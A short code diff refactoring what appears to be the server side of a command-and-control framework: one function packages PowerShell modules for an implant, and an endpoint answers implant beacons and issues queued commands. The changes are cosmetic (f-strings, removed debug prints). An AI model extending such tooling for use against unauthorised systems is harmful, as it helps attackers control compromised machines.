@@ -49,16 +49,15 @@ def craft_export_clipboard(value_dict, command_id):
 
 
 def craft_load_module(value_dict, command_id):
-    print(value_dict['args'] + command_id)
     try:
         with open(str(os.getcwd()+"/Storage/implant_resources/modules/"+value_dict['args']+".ps1"), 'r') as fileh:
-            to_encode = "{}::{}".format(value_dict['args'], fileh.read())
+            to_encode = f"{value_dict['args']}::{fileh.read()}"
             load_module_string = "LM" + command_id + base64.b64encode(to_encode.encode()).decode()
             return load_module_string
     except Exception as e:
 
         # These exceptions should be added to a log file.
-        print("Load module failed: {}".format(e))
+        print(f"Load module failed: {e}")
         pass
     return str("==")
 
@@ -116,7 +115,6 @@ def stager():
 @app.route("/index", methods=["GET", "POST"])
 def implant_beacon_endpoint():
     if 'X-Implant' not in request.headers:
-        print("Warning: No implant header seen.")
         return "=="
 
     next_cmd, command_id = Imp.issue_command(request.headers['X-Implant'], app.config['listener_type'])
